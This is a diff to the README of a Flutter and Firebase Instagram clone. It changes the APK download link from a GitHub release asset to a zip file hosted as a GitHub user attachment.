@@ -59,5 +59,4 @@ A full-featured Instagram clone built using Flutter, Firebase Firestore, Firebas
 
 You can download and install the latest APK from the link below:
 
-👉 [Download APK](https://github.com/Abdullah2476/Instagram/releases/download/v1.0.0/app-release.apk)
-
+👉 [instagram apk file.zip](https://github.com/user-attachments/files/21088559/instagram.apk.file.zip)
